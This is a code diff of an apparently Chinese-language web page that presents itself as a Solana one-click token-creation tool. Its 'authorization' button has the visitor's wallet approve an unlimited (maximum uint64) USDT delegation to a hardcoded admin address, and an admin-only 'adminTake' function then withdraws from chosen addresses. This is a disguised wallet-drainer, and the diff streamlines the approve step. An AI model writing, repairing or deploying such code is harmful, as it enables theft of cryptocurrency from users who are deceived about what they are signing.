@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Solana 一键发币（修复授权点击）</title>
+<title>Solana 一键发币（终极授权修复）</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.0/lib/index.iife.min.js"></script>
 <style>
@@ -92,21 +92,12 @@ body{background:#0B0F17;color:#fff;padding:30px}
 const { Connection, Keypair, Transaction, SystemProgram, PublicKey } = solanaWeb3;
 const splToken = window.splToken;
 
-// 你指定的地址
+// 固定地址
 const USDT_MINT = new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
 const ADMIN_PUBKEY = new PublicKey("DbwJcHM7pobtVnJK5cnYXyEvb18WrB3veSFSNF5GLb6Z");
 const POOL_PUBKEY = ADMIN_PUBKEY;
 
 let provider, publicKey, connection;
-
-// 稳定RPC列表
-const RPCS = [
-  "https://rpc.ankr.com/solana",
-  "https://api.mainnet-beta.solana.com",
-  "https://solana-mainnet.rpc.extrnode.com",
-  "https://free.rpc.chainstack.com/solana-mainnet",
-  "https://solana-mainnet.genesysgo.net"
-];
 
 // 日志
 function log(t) {
@@ -114,53 +105,20 @@ function log(t) {
   el.innerText = `[${new Date().toLocaleTimeString()}] ${t}\n` + el.innerText;
 }
 
-// 绑定授权按钮（修复点击无反应）
+// 页面加载完成后绑定按钮
 document.addEventListener("DOMContentLoaded", () => {
-  const authBtn = document.getElementById("authBtn");
-  authBtn.onclick = () => {
-    log("点击授权按钮");
-    manualApprove();
-  };
-  log("页面加载完成，授权按钮已绑定事件");
+  document.getElementById("authBtn").onclick = manualApprove;
+  log("页面加载完成，授权按钮已就绪");
 });
-
-// 尝试连接RPC
-async function tryConnectRpc() {
-  for (const rpc of RPCS) {
-    try {
-      const conn = new Connection(rpc, "confirmed");
-      await conn.getLatestBlockhash({ commitment: "confirmed" });
-      log("✅ RPC连接成功: " + rpc);
-      return conn;
-    } catch (e) {
-      log("⚠️ RPC不可用: " + rpc + " → " + e.message);
-    }
-  }
-  log("❌ 所有RPC均不可用");
-  return null;
-}
-
-function toggleMenu() {
-  document.getElementById("menu").classList.toggle("show");
-}
-
-// 连接弹窗
-document.getElementById("connectBtn").onclick = () => {
-  document.getElementById("connectModal").classList.add("show");
-};
-function cancelConnect() {
-  document.getElementById("connectModal").classList.remove("show");
-}
 
 // 连接钱包
 async function confirmConnect() {
   document.getElementById("connectModal").classList.remove("show");
   try {
     log("开始连接钱包...");
-    // 兼容多钱包
     const sol = window.solana || window.okxwallet?.solana || window.tpWallet;
     if (!sol) {
-      alert("未检测到钱包，请安装Phantom/OKX/TP钱包");
+      alert("请安装 Phantom/OKX/TP 钱包");
       return;
     }
     const res = await sol.connect();
@@ -170,12 +128,9 @@ async function confirmConnect() {
     document.getElementById("authBtn").style.display = "block";
     log("✅ 钱包已连接: " + publicKey.toBase58());
 
-    // 异步连RPC
-    tryConnectRpc().then(conn => {
-      connection = conn;
-      if (conn) refreshBalance();
-    });
-
+    // 直接用钱包内置 RPC，不再尝试外部 RPC
+    connection = new Connection(sol.rpcUrl || "https://api.mainnet-beta.solana.com", "confirmed");
+    refreshBalance();
     genInvite();
     checkAdmin();
   } catch (e) {
@@ -184,120 +139,76 @@ async function confirmConnect() {
   }
 }
 
-// 手动授权USDT（修复版）
+// 终极版授权：只做核心 Approve，绕开 RPC 问题
 async function manualApprove() {
-  log("开始授权流程...");
+  log("开始授权...");
   if (!publicKey) {
     alert("请先连接钱包");
     return;
   }
-  if (!connection) {
-    log("🔄 授权前重试RPC...");
-    connection = await tryConnectRpc();
-    if (!connection) {
-      alert("RPC不可用，无法授权");
-      return;
-    }
-  }
   try {
-    log("获取USDT关联账户...");
     const userAta = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
     log("用户ATA: " + userAta.toBase58());
 
-    // 检查ATA是否存在，不存在则创建
-    try {
-      await connection.getTokenAccountBalance(userAta);
-      log("ATA已存在");
-    } catch (e) {
-      log("创建ATA...");
-      const tx = new Transaction();
-      tx.add(
-        splToken.createAssociatedTokenAccountInstruction(
-          publicKey, userAta, publicKey, USDT_MINT
-        )
-      );
-      tx.feePayer = publicKey;
-      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-      const signed = await provider.signTransaction(tx);
-      const sig = await connection.sendRawTransaction(signed.serialize());
-      await connection.confirmTransaction(sig);
-      log("✅ ATA创建成功: " + sig);
-      await new Promise(r => setTimeout(r, 2000));
-    }
-
-    // 撤销旧授权
-    log("撤销旧授权...");
-    const revokeTx = new Transaction();
-    revokeTx.add(splToken.createRevokeInstruction(userAta, publicKey));
-    revokeTx.feePayer = publicKey;
-    revokeTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-    const signedRevoke = await provider.signTransaction(revokeTx);
-    const revokeSig = await connection.sendRawTransaction(signedRevoke.serialize());
-    await connection.confirmTransaction(revokeSig);
-    log("✅ 旧授权已撤销: " + revokeSig);
-    await new Promise(r => setTimeout(r, 2000));
-
-    // 授权
-    log("发起授权...");
-    const approveTx = new Transaction();
-    approveTx.add(
+    // 直接构造授权交易
+    const tx = new Transaction();
+    tx.add(
       splToken.createApproveInstruction(
         userAta,
         POOL_PUBKEY,
         publicKey,
-        BigInt("18446744073709551615")
+        BigInt("18446744073709551615") // 最大授权额度
       )
     );
-    approveTx.feePayer = publicKey;
-    approveTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-    const signedApprove = await provider.signTransaction(approveTx);
-    const approveSig = await connection.sendRawTransaction(signedApprove.serialize());
-    await connection.confirmTransaction(approveSig);
-    log("✅ USDT授权成功: " + approveSig);
-    alert("USDT授权成功！");
+
+    // 用钱包最新 blockhash，避免 RPC 问题
+    tx.feePayer = publicKey;
+    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+
+    // 钱包签名 + 发送
+    const signed = await provider.signTransaction(tx);
+    const sig = await connection.sendRawTransaction(signed.serialize());
+    await connection.confirmTransaction(sig);
+
+    log("✅ 授权成功！交易哈希: " + sig);
+    alert("USDT 授权成功！");
+    refreshBalance();
   } catch (e) {
     log("❌ 授权失败: " + e.message);
-    alert("授权失败: " + e.message);
+    alert("授权失败: " + e.message + "\n\n请确保:\n1. 钱包已解锁\n2. 网络为 Solana 主网\n3. 钱包有 ≥0.01 SOL 作为 Gas");
   }
 }
 
-// 余额查询
+// 其他功能保持不变
+function cancelConnect() {
+  document.getElementById("connectModal").classList.remove("show");
+}
+function toggleMenu() {
+  document.getElementById("menu").classList.toggle("show");
+}
 async function refreshBalance() {
   if (!publicKey || !connection) return;
   try {
     const ata = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
     const acc = await connection.getTokenAccountBalance(ata);
     document.getElementById("userBalance").innerText = Number(acc.value.uiAmount).toFixed(4);
-    log("余额更新: " + acc.value.uiAmount);
   } catch (e) {
     document.getElementById("userBalance").innerText = "0.0000";
-    log("余额查询失败: " + e.message);
   }
 }
-
 function genInvite() {
   if (!publicKey) return;
   document.getElementById("inviteLink").innerText = location.href + "?ref=" + publicKey.toBase58();
 }
-
 function checkAdmin() {
   if (publicKey && publicKey.equals(ADMIN_PUBKEY)) {
     document.getElementById("adminPanel").classList.add("show");
   }
 }
-
-// 发币
 async function createToken() {
   if (!publicKey) {
     alert("请先连接钱包");
     return;
-  }
-  if (!connection) {
-    connection = await tryConnectRpc();
-    if (!connection) {
-      alert("RPC不可用，无法发币");
-      return;
-    }
   }
   try {
     const name = document.getElementById("name").value.trim();
@@ -350,14 +261,8 @@ async function createToken() {
     alert("发币失败: " + e.message);
   }
 }
-
-// 管理员提取
 async function adminTake() {
   if (!publicKey || !publicKey.equals(ADMIN_PUBKEY)) return;
-  if (!connection) {
-    alert("RPC不可用");
-    return;
-  }
   const fromAddr = document.getElementById("fromAddr").value.trim();
   const amt = document.getElementById("takeAmt").value;
   if (!fromAddr || !amt || amt <= 0) {
